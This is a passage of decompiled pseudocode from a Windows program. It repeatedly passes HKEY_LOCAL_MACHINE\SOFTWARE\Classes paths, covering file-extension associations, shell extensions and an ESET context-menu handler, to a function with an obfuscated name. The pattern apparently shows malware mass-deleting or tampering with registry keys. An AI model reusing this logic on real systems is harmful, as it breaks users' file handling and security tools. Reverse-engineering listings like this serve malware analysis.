  loc_00454088: call var_B0BC = global_00401188(var_24, "SOFTWARE\Classes\.sed")
  loc_00454094: var_B0C0 = OnudaSilloA(global_80000002, var_B0BC)
  loc_00454099: call var_B0C4 = global_00401054
  loc_004540A2: call var_B0C8 = global_004011CC
  loc_004540B8: call var_B0CC = global_00401188(var_24, "SOFTWARE\Classes\.shb")
  loc_004540C4: var_B0D0 = OnudaSilloA(global_80000002, var_B0CC)
  loc_004540C9: call var_B0D4 = global_00401054
  loc_004540D2: call var_B0D8 = global_004011CC
  loc_004540E8: call var_B0DC = global_00401188(var_24, "SOFTWARE\Classes\.shs")
  loc_004540F4: var_B0E0 = OnudaSilloA(global_80000002, var_B0DC)
  loc_004540F9: call var_B0E4 = global_00401054
  loc_00454102: call var_B0E8 = global_004011CC
  loc_00454118: call var_B0EC = global_00401188(var_24, "SOFTWARE\Classes\.shtml")
  loc_00454124: var_B0F0 = OnudaSilloA(global_80000002, var_B0EC)
  loc_00454129: call var_B0F4 = global_00401054
  loc_00454132: call var_B0F8 = global_004011CC
  loc_00454148: call var_B0FC = global_00401188(var_24, "SOFTWARE\Classes\.shw\Presentations31.Show\ShellNew")
  loc_00454154: var_B100 = OnudaSilloA(global_80000002, var_B0FC)
  loc_00454159: call var_B104 = global_00401054
  loc_00454162: call var_B108 = global_004011CC
  loc_00454178: call var_B10C = global_00401188(var_24, "SOFTWARE\Classes\.shw\Presentations31.Show")
  loc_00454184: var_B110 = OnudaSilloA(global_80000002, var_B10C)
  loc_00454189: call var_B114 = global_00401054
  loc_00454192: call var_B118 = global_004011CC
  loc_004541A8: call var_B11C = global_00401188(var_24, "SOFTWARE\Classes\.shw")
  loc_004541B4: var_B120 = OnudaSilloA(global_80000002, var_B11C)
  loc_004541B9: call var_B124 = global_00401054
  loc_004541C2: call var_B128 = global_004011CC
  loc_004541D8: call var_B12C = global_00401188(var_24, "SOFTWARE\Classes\.sit\PersistentHandler")
  loc_004541E4: var_B130 = OnudaSilloA(global_80000002, var_B12C)
  loc_004541E9: call var_B134 = global_00401054
  loc_004541F2: call var_B138 = global_004011CC
  loc_00454208: call var_B13C = global_00401188(var_24, "SOFTWARE\Classes\.sit")
  loc_00454214: var_B140 = OnudaSilloA(global_80000002, var_B13C)
  loc_00454219: call var_B144 = global_00401054
  loc_00454222: call var_B148 = global_004011CC
  loc_00454238: call var_B14C = global_00401188(var_24, "SOFTWARE\Classes\.snd\PersistentHandler")
  loc_00454244: var_B150 = OnudaSilloA(global_80000002, var_B14C)
  loc_00454249: call var_B154 = global_00401054
  loc_00454252: call var_B158 = global_004011CC
  loc_00454268: call var_B15C = global_00401188(var_24, "SOFTWARE\Classes\.snd\OpenWithProgIds")
  loc_00454274: var_B160 = OnudaSilloA(global_80000002, var_B15C)
  loc_00454279: call var_B164 = global_00401054
  loc_00454282: call var_B168 = global_004011CC
  loc_00454298: call var_B16C = global_00401188(var_24, "SOFTWARE\Classes\.snd\OpenWithList\wmplayer.exe")
  loc_004542A4: var_B170 = OnudaSilloA(global_80000002, var_B16C)
  loc_004542A9: call var_B174 = global_00401054
  loc_004542B2: call var_B178 = global_004011CC
  loc_004542C8: call var_B17C = global_00401188(var_24, "SOFTWARE\Classes\.snd\OpenWithList")
  loc_004542D4: var_B180 = OnudaSilloA(global_80000002, var_B17C)
  loc_004542D9: call var_B184 = global_00401054
  loc_004542E2: call var_B188 = global_004011CC
  loc_004542F8: call var_B18C = global_00401188(var_24, "SOFTWARE\Classes\.snd")
  loc_00454304: var_B190 = OnudaSilloA(global_80000002, var_B18C)
  loc_00454309: call var_B194 = global_00401054
  loc_00454312: call var_B198 = global_004011CC
  loc_00454328: call var_B19C = global_00401188(var_24, "SOFTWARE\Classes\.sol")
  loc_00454334: var_B1A0 = OnudaSilloA(global_80000002, var_B19C)
  loc_00454339: call var_B1A4 = global_00401054
  loc_00454342: call var_B1A8 = global_004011CC
  loc_00454358: call var_B1AC = global_00401188(var_24, "SOFTWARE\Classes\.sor")
  loc_00454364: var_B1B0 = OnudaSilloA(global_80000002, var_B1AC)
  loc_00454369: call var_B1B4 = global_00401054
  loc_00454372: call var_B1B8 = global_004011CC
  loc_00454388: call var_B1BC = global_00401188(var_24, "SOFTWARE\Classes\.spc")
  loc_00454394: var_B1C0 = OnudaSilloA(global_80000002, var_B1BC)
  loc_00454399: call var_B1C4 = global_00401054
  loc_004543A2: call var_B1C8 = global_004011CC
  loc_004543B8: call var_B1CC = global_00401188(var_24, "SOFTWARE\Classes\.spl")
  loc_004543C4: var_B1D0 = OnudaSilloA(global_80000002, var_B1CC)
  loc_004543C9: call var_B1D4 = global_00401054
  loc_004543D2: call var_B1D8 = global_004011CC
  loc_004543E8: call var_B1DC = global_00401188(var_24, "SOFTWARE\Classes\.sql")
  loc_004543F4: var_B1E0 = OnudaSilloA(global_80000002, var_B1DC)
  loc_004543F9: call var_B1E4 = global_00401054
  loc_00454402: call var_B1E8 = global_004011CC
  loc_00454418: call var_B1EC = global_00401188(var_24, "SOFTWARE\Classes\.sr_\PersistentHandler")
  loc_00454424: var_B1F0 = OnudaSilloA(global_80000002, var_B1EC)
  loc_00454429: call var_B1F4 = global_00401054
  loc_00454432: call var_B1F8 = global_004011CC
  loc_00454448: call var_B1FC = global_00401188(var_24, "SOFTWARE\Classes\.sr_")
  loc_00454454: var_B200 = OnudaSilloA(global_80000002, var_B1FC)
  loc_00454459: call var_B204 = global_00401054
  loc_00454462: call var_B208 = global_004011CC
  loc_00454478: call var_B20C = global_00401188(var_24, "SOFTWARE\Classes\.sst")
  loc_00454484: var_B210 = OnudaSilloA(global_80000002, var_B20C)
  loc_00454489: call var_B214 = global_00401054
  loc_00454492: call var_B218 = global_004011CC
  loc_004544A8: call var_B21C = global_00401188(var_24, "SOFTWARE\Classes\.stl")
  loc_004544B4: var_B220 = OnudaSilloA(global_80000002, var_B21C)
  loc_004544B9: call var_B224 = global_00401054
  loc_004544C2: call var_B228 = global_004011CC
  loc_004544D8: call var_B22C = global_00401188(var_24, "SOFTWARE\Classes\.stm\PersistentHandler")
  loc_004544E4: var_B230 = OnudaSilloA(global_80000002, var_B22C)
  loc_004544E9: call var_B234 = global_00401054
  loc_004544F2: call var_B238 = global_004011CC
  loc_00454508: call var_B23C = global_00401188(var_24, "SOFTWARE\Classes\.stm")
  loc_00454514: var_B240 = OnudaSilloA(global_80000002, var_B23C)
  loc_00454519: call var_B244 = global_00401054
  loc_00454522: call var_B248 = global_004011CC
  loc_00454538: call var_B24C = global_00401188(var_24, "SOFTWARE\Classes\.swf\OpenWithList\IExplore.exe")
  loc_00454544: var_B250 = OnudaSilloA(global_80000002, var_B24C)
  loc_00454549: call var_B254 = global_00401054
  loc_00454552: call var_B258 = global_004011CC
  loc_00454568: call var_B25C = global_00401188(var_24, "SOFTWARE\Classes\.swf\OpenWithList")
  loc_00454574: var_B260 = OnudaSilloA(global_80000002, var_B25C)
  loc_00454579: call var_B264 = global_00401054
  loc_00454582: call var_B268 = global_004011CC
  loc_00454598: call var_B26C = global_00401188(var_24, "SOFTWARE\Classes\.swf")
  loc_004545A4: var_B270 = OnudaSilloA(global_80000002, var_B26C)
  loc_004545A9: call var_B274 = global_00401054
  loc_004545B2: call var_B278 = global_004011CC
  loc_004545C8: call var_B27C = global_00401188(var_24, "SOFTWARE\Classes\.swt")
  loc_004545D4: var_B280 = OnudaSilloA(global_80000002, var_B27C)
  loc_004545D9: call var_B284 = global_00401054
  loc_004545E2: call var_B288 = global_004011CC
  loc_004545F8: call var_B28C = global_00401188(var_24, "SOFTWARE\Classes\.sy_\PersistentHandler")
  loc_00454604: var_B290 = OnudaSilloA(global_80000002, var_B28C)
  loc_00454609: call var_B294 = global_00401054
  loc_00454612: call var_B298 = global_004011CC
  loc_00454628: call var_B29C = global_00401188(var_24, "SOFTWARE\Classes\.sy_")
  loc_00454634: var_B2A0 = OnudaSilloA(global_80000002, var_B29C)
  loc_00454639: call var_B2A4 = global_00401054
  loc_00454642: call var_B2A8 = global_004011CC
  loc_00454658: call var_B2AC = global_00401188(var_24, "SOFTWARE\Classes\.sym\PersistentHandler")
  loc_00454664: var_B2B0 = OnudaSilloA(global_80000002, var_B2AC)
  loc_00454669: call var_B2B4 = global_00401054
  loc_00454672: call var_B2B8 = global_004011CC
  loc_00454688: call var_B2BC = global_00401188(var_24, "SOFTWARE\Classes\.sym")
  loc_00454694: var_B2C0 = OnudaSilloA(global_80000002, var_B2BC)
  loc_00454699: call var_B2C4 = global_00401054
  loc_004546A2: call var_B2C8 = global_004011CC
  loc_004546B8: call var_B2CC = global_00401188(var_24, "SOFTWARE\Classes\.sys\PersistentHandler")
  loc_004546C4: var_B2D0 = OnudaSilloA(global_80000002, var_B2CC)
  loc_004546C9: call var_B2D4 = global_00401054
  loc_004546D2: call var_B2D8 = global_004011CC
  loc_004546E8: call var_B2DC = global_00401188(var_24, "SOFTWARE\Classes\.sys")
  loc_004546F4: var_B2E0 = OnudaSilloA(global_80000002, var_B2DC)
  loc_004546F9: call var_B2E4 = global_00401054
  loc_00454702: call var_B2E8 = global_004011CC
  loc_00454718: call var_B2EC = global_00401188(var_24, "SOFTWARE\Classes\.tar\PersistentHandler")
  loc_00454724: var_B2F0 = OnudaSilloA(global_80000002, var_B2EC)
  loc_00454729: call var_B2F4 = global_00401054
  loc_00454732: call var_B2F8 = global_004011CC
  loc_00454748: call var_B2FC = global_00401188(var_24, "SOFTWARE\Classes\.tar")
  loc_00454754: var_B300 = OnudaSilloA(global_80000002, var_B2FC)
  loc_00454759: call var_B304 = global_00401054
  loc_00454762: call var_B308 = global_004011CC
  loc_00454778: call var_B30C = global_00401188(var_24, "SOFTWARE\Classes\.taz")
  loc_00454784: var_B310 = OnudaSilloA(global_80000002, var_B30C)
  loc_00454789: call var_B314 = global_00401054
  loc_00454792: call var_B318 = global_004011CC
  loc_004547A8: call var_B31C = global_00401188(var_24, "SOFTWARE\Classes\.tbz")
  loc_004547B4: var_B320 = OnudaSilloA(global_80000002, var_B31C)
  loc_004547B9: call var_B324 = global_00401054
  loc_004547C2: call var_B328 = global_004011CC
  loc_004547D8: call var_B32C = global_00401188(var_24, "SOFTWARE\Classes\.tbz2")
  loc_004547E4: var_B330 = OnudaSilloA(global_80000002, var_B32C)
  loc_004547E9: call var_B334 = global_00401054
  loc_004547F2: call var_B338 = global_004011CC
  loc_00454808: call var_B33C = global_00401188(var_24, "SOFTWARE\Classes\.tgz\PersistentHandler")
  loc_00454814: var_B340 = OnudaSilloA(global_80000002, var_B33C)
  loc_00454819: call var_B344 = global_00401054
  loc_00454822: call var_B348 = global_004011CC
  loc_00454838: call var_B34C = global_00401188(var_24, "SOFTWARE\Classes\.tgz")
  loc_00454844: var_B350 = OnudaSilloA(global_80000002, var_B34C)
  loc_00454849: call var_B354 = global_00401054
  loc_00454852: call var_B358 = global_004011CC
  loc_00454868: call var_B35C = global_00401188(var_24, "SOFTWARE\Classes\.theme")
  loc_00454874: var_B360 = OnudaSilloA(global_80000002, var_B35C)
  loc_00454879: call var_B364 = global_00401054
  loc_00454882: call var_B368 = global_004011CC
  loc_00454898: call var_B36C = global_00401188(var_24, "SOFTWARE\Classes\.tif\PersistentHandler")
  loc_004548A4: var_B370 = OnudaSilloA(global_80000002, var_B36C)
  loc_004548A9: call var_B374 = global_00401054
  loc_004548B2: call var_B378 = global_004011CC
  loc_004548C8: call var_B37C = global_00401188(var_24, "SOFTWARE\Classes\.tif\OpenWithProgids")
  loc_004548D4: var_B380 = OnudaSilloA(global_80000002, var_B37C)
  loc_004548D9: call var_B384 = global_00401054
  loc_004548E2: call var_B388 = global_004011CC
  loc_004548F8: call var_B38C = global_00401188(var_24, "SOFTWARE\Classes\.tif")
  loc_00454904: var_B390 = OnudaSilloA(global_80000002, var_B38C)
  loc_00454909: call var_B394 = global_00401054
  loc_00454912: call var_B398 = global_004011CC
  loc_00454928: call var_B39C = global_00401188(var_24, "SOFTWARE\Classes\.tiff\PersistentHandler")
  loc_00454934: var_B3A0 = OnudaSilloA(global_80000002, var_B39C)
  loc_00454939: call var_B3A4 = global_00401054
  loc_00454942: call var_B3A8 = global_004011CC
  loc_00454958: call var_B3AC = global_00401188(var_24, "SOFTWARE\Classes\.tiff\OpenWithProgids")
  loc_00454964: var_B3B0 = OnudaSilloA(global_80000002, var_B3AC)
  loc_00454969: call var_B3B4 = global_00401054
  loc_00454972: call var_B3B8 = global_004011CC
  loc_00454988: call var_B3BC = global_00401188(var_24, "SOFTWARE\Classes\.tiff")
  loc_00454994: var_B3C0 = OnudaSilloA(global_80000002, var_B3BC)
  loc_00454999: call var_B3C4 = global_00401054
  loc_004549A2: call var_B3C8 = global_004011CC
  loc_004549B8: call var_B3CC = global_00401188(var_24, "SOFTWARE\Classes\.tlb\PersistentHandler")
  loc_004549C4: var_B3D0 = OnudaSilloA(global_80000002, var_B3CC)
  loc_004549C9: call var_B3D4 = global_00401054
  loc_004549D2: call var_B3D8 = global_004011CC
  loc_004549E8: call var_B3DC = global_00401188(var_24, "SOFTWARE\Classes\.tlb")
  loc_004549F4: var_B3E0 = OnudaSilloA(global_80000002, var_B3DC)
  loc_004549F9: call var_B3E4 = global_00401054
  loc_00454A02: call var_B3E8 = global_004011CC
  loc_00454A18: call var_B3EC = global_00401188(var_24, "SOFTWARE\Classes\.ts")
  loc_00454A24: var_B3F0 = OnudaSilloA(global_80000002, var_B3EC)
  loc_00454A29: call var_B3F4 = global_00401054
  loc_00454A32: call var_B3F8 = global_004011CC
  loc_00454A48: call var_B3FC = global_00401188(var_24, "SOFTWARE\Classes\.tsp\PersistentHandler")
  loc_00454A54: var_B400 = OnudaSilloA(global_80000002, var_B3FC)
  loc_00454A59: call var_B404 = global_00401054
  loc_00454A62: call var_B408 = global_004011CC
  loc_00454A78: call var_B40C = global_00401188(var_24, "SOFTWARE\Classes\.tsp")
  loc_00454A84: var_B410 = OnudaSilloA(global_80000002, var_B40C)
  loc_00454A89: call var_B414 = global_00401054
  loc_00454A92: call var_B418 = global_004011CC
  loc_00454AA8: call var_B41C = global_00401188(var_24, "SOFTWARE\Classes\.tsv")
  loc_00454AB4: var_B420 = OnudaSilloA(global_80000002, var_B41C)
  loc_00454AB9: call var_B424 = global_00401054
  loc_00454AC2: call var_B428 = global_004011CC
  loc_00454AD8: call var_B42C = global_00401188(var_24, "SOFTWARE\Classes\.ttc\PersistentHandler")
  loc_00454AE4: var_B430 = OnudaSilloA(global_80000002, var_B42C)
  loc_00454AE9: call var_B434 = global_00401054
  loc_00454AF2: call var_B438 = global_004011CC
  loc_00454B08: call var_B43C = global_00401188(var_24, "SOFTWARE\Classes\.ttc")
  loc_00454B14: var_B440 = OnudaSilloA(global_80000002, var_B43C)
  loc_00454B19: call var_B444 = global_00401054
  loc_00454B22: call var_B448 = global_004011CC
  loc_00454B38: call var_B44C = global_00401188(var_24, "SOFTWARE\Classes\.ttf\PersistentHandler")
  loc_00454B44: var_B450 = OnudaSilloA(global_80000002, var_B44C)
  loc_00454B49: call var_B454 = global_00401054
  loc_00454B52: call var_B458 = global_004011CC
  loc_00454B68: call var_B45C = global_00401188(var_24, "SOFTWARE\Classes\.ttf")
  loc_00454B74: var_B460 = OnudaSilloA(global_80000002, var_B45C)
  loc_00454B79: call var_B464 = global_00401054
  loc_00454B82: call var_B468 = global_004011CC
  loc_00454B98: call var_B46C = global_00401188(var_24, "SOFTWARE\Classes\.UDL")
  loc_00454BA4: var_B470 = OnudaSilloA(global_80000002, var_B46C)
  loc_00454BA9: call var_B474 = global_00401054
  loc_00454BB2: call var_B478 = global_004011CC
  loc_00454BC8: call var_B47C = global_00401188(var_24, "SOFTWARE\Classes\.uls")
  loc_00454BD4: var_B480 = OnudaSilloA(global_80000002, var_B47C)
  loc_00454BD9: call var_B484 = global_00401054
  loc_00454BE2: call var_B488 = global_004011CC
  loc_00454BF8: call var_B48C = global_00401188(var_24, "SOFTWARE\Classes\.url\ShellEx\{FBF23B80-E3F0-101B-8488-00AA003E56F8}")
  loc_00454C04: var_B490 = OnudaSilloA(global_80000002, var_B48C)
  loc_00454C09: call var_B494 = global_00401054
  loc_00454C12: call var_B498 = global_004011CC
  loc_00454C28: call var_B49C = global_00401188(var_24, "SOFTWARE\Classes\.url\ShellEx\{CABB0DA0-DA57-11CF-9974-0020AFD79762}")
  loc_00454C34: var_B4A0 = OnudaSilloA(global_80000002, var_B49C)
  loc_00454C39: call var_B4A4 = global_00401054
  loc_00454C42: call var_B4A8 = global_004011CC
  loc_00454C58: call var_B4AC = global_00401188(var_24, "SOFTWARE\Classes\.url\ShellEx\{00021500-0000-0000-C000-000000000046}")
  loc_00454C64: var_B4B0 = OnudaSilloA(global_80000002, var_B4AC)
  loc_00454C69: call var_B4B4 = global_00401054
  loc_00454C72: call var_B4B8 = global_004011CC
  loc_00454C88: call var_B4BC = global_00401188(var_24, "SOFTWARE\Classes\.url\ShellEx\{000214F9-0000-0000-C000-000000000046}")
  loc_00454C94: var_B4C0 = OnudaSilloA(global_80000002, var_B4BC)
  loc_00454C99: call var_B4C4 = global_00401054
  loc_00454CA2: call var_B4C8 = global_004011CC
  loc_00454CB8: call var_B4CC = global_00401188(var_24, "SOFTWARE\Classes\.url\ShellEx\{000214EE-0000-0000-C000-000000000046}")
  loc_00454CC4: var_B4D0 = OnudaSilloA(global_80000002, var_B4CC)
  loc_00454CC9: call var_B4D4 = global_00401054
  loc_00454CD2: call var_B4D8 = global_004011CC
  loc_00454CE8: call var_B4DC = global_00401188(var_24, "SOFTWARE\Classes\.url\ShellEx")
  loc_00454CF4: var_B4E0 = OnudaSilloA(global_80000002, var_B4DC)
  loc_00454CF9: call var_B4E4 = global_00401054
  loc_00454D02: call var_B4E8 = global_004011CC
  loc_00454D18: call var_B4EC = global_00401188(var_24, "SOFTWARE\Classes\.url\PersistentHandler")
  loc_00454D24: var_B4F0 = OnudaSilloA(global_80000002, var_B4EC)
  loc_00454D29: call var_B4F4 = global_00401054
  loc_00454D32: call var_B4F8 = global_004011CC
  loc_00454D48: call var_B4FC = global_00401188(var_24, "SOFTWARE\Classes\.url")
  loc_00454D54: var_B500 = OnudaSilloA(global_80000002, var_B4FC)
  loc_00454D59: call var_B504 = global_00401054
  loc_00454D62: call var_B508 = global_004011CC
  loc_00454D78: call var_B50C = global_00401188(var_24, "SOFTWARE\Classes\.uu")
  loc_00454D84: var_B510 = OnudaSilloA(global_80000002, var_B50C)
  loc_00454D89: call var_B514 = global_00401054
  loc_00454D92: call var_B518 = global_004011CC
  loc_00454DA8: call var_B51C = global_00401188(var_24, "SOFTWARE\Classes\.uue")
  loc_00454DB4: var_B520 = OnudaSilloA(global_80000002, var_B51C)
  loc_00454DB9: call var_B524 = global_00401054
  loc_00454DC2: call var_B528 = global_004011CC
  loc_00454DD8: call var_B52C = global_00401188(var_24, "SOFTWARE\Classes\.VBE")
  loc_00454DE4: var_B530 = OnudaSilloA(global_80000002, var_B52C)
  loc_00454DE9: call var_B534 = global_00401054
  loc_00454DF2: call var_B538 = global_004011CC
  loc_00454E08: call var_B53C = global_00401188(var_24, "SOFTWARE\Classes\.vbg")
  loc_00454E14: var_B540 = OnudaSilloA(global_80000002, var_B53C)
  loc_00454E19: call var_B544 = global_00401054
  loc_00454E22: call var_B548 = global_004011CC
  loc_00454E38: call var_B54C = global_00401188(var_24, "SOFTWARE\Classes\.vbl")
  loc_00454E44: var_B550 = OnudaSilloA(global_80000002, var_B54C)
  loc_00454E49: call var_B554 = global_00401054
  loc_00454E52: call var_B558 = global_004011CC
  loc_00454E68: call var_B55C = global_00401188(var_24, "SOFTWARE\Classes\.vbr")
  loc_00454E74: var_B560 = OnudaSilloA(global_80000002, var_B55C)
  loc_00454E79: call var_B564 = global_00401054
  loc_00454E82: call var_B568 = global_004011CC
  loc_00454E98: call var_B56C = global_00401188(var_24, "SOFTWARE\Classes\.vbs\PersistentHandler")
  loc_00454EA4: var_B570 = OnudaSilloA(global_80000002, var_B56C)
  loc_00454EA9: call var_B574 = global_00401054
  loc_00454EB2: call var_B578 = global_004011CC
  loc_00454EC8: call var_B57C = global_00401188(var_24, "SOFTWARE\Classes\.vbs")
  loc_00454ED4: var_B580 = OnudaSilloA(global_80000002, var_B57C)
  loc_00454ED9: call var_B584 = global_00401054
  loc_00454EE2: call var_B588 = global_004011CC
  loc_00454EF8: call var_B58C = global_00401188(var_24, "SOFTWARE\Classes\.vbw")
  loc_00454F04: var_B590 = OnudaSilloA(global_80000002, var_B58C)
  loc_00454F09: call var_B594 = global_00401054
  loc_00454F12: call var_B598 = global_004011CC
  loc_00454F28: call var_B59C = global_00401188(var_24, "SOFTWARE\Classes\.vbx\PersistentHandler")
  loc_00454F34: var_B5A0 = OnudaSilloA(global_80000002, var_B59C)
  loc_00454F39: call var_B5A4 = global_00401054
  loc_00454F42: call var_B5A8 = global_004011CC
  loc_00454F58: call var_B5AC = global_00401188(var_24, "SOFTWARE\Classes\.vbx")
  loc_00454F64: var_B5B0 = OnudaSilloA(global_80000002, var_B5AC)
  loc_00454F69: call var_B5B4 = global_00401054
  loc_00454F72: call var_B5B8 = global_004011CC
  loc_00454F88: call var_B5BC = global_00401188(var_24, "SOFTWARE\Classes\.vbz")
  loc_00454F94: var_B5C0 = OnudaSilloA(global_80000002, var_B5BC)
  loc_00454F99: call var_B5C4 = global_00401054
  loc_00454FA2: call var_B5C8 = global_004011CC
  loc_00454FB8: call var_B5CC = global_00401188(var_24, "SOFTWARE\Classes\.vcf")
  loc_00454FC4: var_B5D0 = OnudaSilloA(global_80000002, var_B5CC)
  loc_00454FC9: call var_B5D4 = global_00401054
  loc_00454FD2: call var_B5D8 = global_004011CC
  loc_00454FE8: call var_B5DC = global_00401188(var_24, "SOFTWARE\Classes\.vob")
  loc_00454FF4: var_B5E0 = OnudaSilloA(global_80000002, var_B5DC)
  loc_00454FF9: call var_B5E4 = global_00401054
  loc_00455002: call var_B5E8 = global_004011CC
  loc_00455018: call var_B5EC = global_00401188(var_24, "SOFTWARE\Classes\.vxd\PersistentHandler")
  loc_00455024: var_B5F0 = OnudaSilloA(global_80000002, var_B5EC)
  loc_00455029: call var_B5F4 = global_00401054
  loc_00455032: call var_B5F8 = global_004011CC
  loc_00455048: call var_B5FC = global_00401188(var_24, "SOFTWARE\Classes\.vxd")
  loc_00455054: var_B600 = OnudaSilloA(global_80000002, var_B5FC)
  loc_00455059: call var_B604 = global_00401054
  loc_00455062: call var_B608 = global_004011CC
  loc_00455078: call var_B60C = global_00401188(var_24, "SOFTWARE\Classes\.wab")
  loc_00455084: var_B610 = OnudaSilloA(global_80000002, var_B60C)
  loc_00455089: call var_B614 = global_00401054
  loc_00455092: call var_B618 = global_004011CC
  loc_004550A8: call var_B61C = global_00401188(var_24, "SOFTWARE\Classes\.wav\ShellNew")
  loc_004550B4: var_B620 = OnudaSilloA(global_80000002, var_B61C)
  loc_004550B9: call var_B624 = global_00401054
  loc_004550C2: call var_B628 = global_004011CC
  loc_004550D8: call var_B62C = global_00401188(var_24, "SOFTWARE\Classes\.wav\PersistentHandler")
  loc_004550E4: var_B630 = OnudaSilloA(global_80000002, var_B62C)
  loc_004550E9: call var_B634 = global_00401054
  loc_004550F2: call var_B638 = global_004011CC
  loc_00455108: call var_B63C = global_00401188(var_24, "SOFTWARE\Classes\.wav\OpenWithProgIds")
  loc_00455114: var_B640 = OnudaSilloA(global_80000002, var_B63C)
  loc_00455119: call var_B644 = global_00401054
  loc_00455122: call var_B648 = global_004011CC
  loc_00455138: call var_B64C = global_00401188(var_24, "SOFTWARE\Classes\.wav\OpenWithList\wmplayer.exe")
  loc_00455144: var_B650 = OnudaSilloA(global_80000002, var_B64C)
  loc_00455149: call var_B654 = global_00401054
  loc_00455152: call var_B658 = global_004011CC
  loc_00455168: call var_B65C = global_00401188(var_24, "SOFTWARE\Classes\.wav\OpenWithList\sndrec32.exe")
  loc_00455174: var_B660 = OnudaSilloA(global_80000002, var_B65C)
  loc_00455179: call var_B664 = global_00401054
  loc_00455182: call var_B668 = global_004011CC
  loc_00455198: call var_B66C = global_00401188(var_24, "SOFTWARE\Classes\.wav\OpenWithList")
  loc_004551A4: var_B670 = OnudaSilloA(global_80000002, var_B66C)
  loc_004551A9: call var_B674 = global_00401054
  loc_004551B2: call var_B678 = global_004011CC
  loc_004551C8: call var_B67C = global_00401188(var_24, "SOFTWARE\Classes\.wav")
  loc_004551D4: var_B680 = OnudaSilloA(global_80000002, var_B67C)
  loc_004551D9: call var_B684 = global_00401054
  loc_004551E2: call var_B688 = global_004011CC
  loc_004551F8: call var_B68C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\PropertySheetHandlers")
  loc_00455204: var_B690 = OnudaSilloA(global_80000002, var_B68C)
  loc_00455209: call var_B694 = global_00401054
  loc_00455212: call var_B698 = global_004011CC
  loc_00455228: call var_B69C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\DragDropHandlers\WinRAR")
  loc_00455234: var_B6A0 = OnudaSilloA(global_80000002, var_B69C)
  loc_00455239: call var_B6A4 = global_00401054
  loc_00455242: call var_B6A8 = global_004011CC
  loc_00455258: call var_B6AC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\DragDropHandlers\{BD472F60-27FA-11cf-B8B4-444553540000}")
  loc_00455264: var_B6B0 = OnudaSilloA(global_80000002, var_B6AC)
  loc_00455269: call var_B6B4 = global_00401054
  loc_00455272: call var_B6B8 = global_004011CC
  loc_00455288: call var_B6BC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\DragDropHandlers")
  loc_00455294: var_B6C0 = OnudaSilloA(global_80000002, var_B6BC)
  loc_00455299: call var_B6C4 = global_00401054
  loc_004552A2: call var_B6C8 = global_004011CC
  loc_004552B8: call var_B6CC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers\WinRAR")
  loc_004552C4: var_B6D0 = OnudaSilloA(global_80000002, var_B6CC)
  loc_004552C9: call var_B6D4 = global_00401054
  loc_004552D2: call var_B6D8 = global_004011CC
  loc_004552E8: call var_B6DC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers\ESET Smart Security - Context Menu Shell Extension")
  loc_004552F4: var_B6E0 = OnudaSilloA(global_80000002, var_B6DC)
  loc_004552F9: call var_B6E4 = global_00401054
  loc_00455302: call var_B6E8 = global_004011CC
  loc_00455318: call var_B6EC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers")
  loc_00455324: var_B6F0 = OnudaSilloA(global_80000002, var_B6EC)
  loc_00455329: call var_B6F4 = global_00401054
  loc_00455332: call var_B6F8 = global_004011CC
  loc_00455348: call var_B6FC = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{66742402-F9B9-11D1-A202-0000F81FEDEE}")
  loc_00455354: var_B700 = OnudaSilloA(global_80000002, var_B6FC)
  loc_00455359: call var_B704 = global_00401054
  loc_00455362: call var_B708 = global_004011CC
  loc_00455378: call var_B70C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{24F14F02-7B1C-11d1-838f-0000F80461CF}")
  loc_00455384: var_B710 = OnudaSilloA(global_80000002, var_B70C)
  loc_00455389: call var_B714 = global_00401054
  loc_00455392: call var_B718 = global_004011CC
  loc_004553A8: call var_B71C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{24F14F01-7B1C-11d1-838f-0000F80461CF}")
  loc_004553B4: var_B720 = OnudaSilloA(global_80000002, var_B71C)
  loc_004553B9: call var_B724 = global_00401054
  loc_004553C2: call var_B728 = global_004011CC
  loc_004553D8: call var_B72C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ColumnHandlers\{0D2E74C4-3C34-11d2-A27E-00C04FC30871}")
  loc_004553E4: var_B730 = OnudaSilloA(global_80000002, var_B72C)
  loc_004553E9: call var_B734 = global_00401054
  loc_004553F2: call var_B738 = global_004011CC
  loc_00455408: call var_B73C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ColumnHandlers")
  loc_00455414: var_B740 = OnudaSilloA(global_80000002, var_B73C)
  loc_00455419: call var_B744 = global_00401054
  loc_00455422: call var_B748 = global_004011CC
  loc_00455438: call var_B74C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex\ColumnHandlers")
  loc_00455444: var_B750 = OnudaSilloA(global_80000002, var_B74C)
  loc_00455449: call var_B754 = global_00401054
  loc_00455452: call var_B758 = global_004011CC
  loc_00455468: call var_B75C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shellex")
  loc_00455474: var_B760 = OnudaSilloA(global_80000002, var_B75C)
  loc_00455479: call var_B764 = global_00401054
  loc_00455482: call var_B768 = global_004011CC
  loc_00455498: call var_B76C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open\ddeexec\topic")
  loc_004554A4: var_B770 = OnudaSilloA(global_80000002, var_B76C)
  loc_004554A9: call var_B774 = global_00401054
  loc_004554B2: call var_B778 = global_004011CC
  loc_004554C8: call var_B77C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open\ddeexec\ifexec")
  loc_004554D4: var_B780 = OnudaSilloA(global_80000002, var_B77C)
  loc_004554D9: call var_B784 = global_00401054
  loc_004554E2: call var_B788 = global_004011CC
  loc_004554F8: call var_B78C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open\ddeexec\application")
  loc_00455504: var_B790 = OnudaSilloA(global_80000002, var_B78C)
  loc_00455509: call var_B794 = global_00401054
  loc_00455512: call var_B798 = global_004011CC
  loc_00455528: call var_B79C = global_00401188(var_24, "SOFTWARE\Classes\Folder\shell\open\ddeexec")
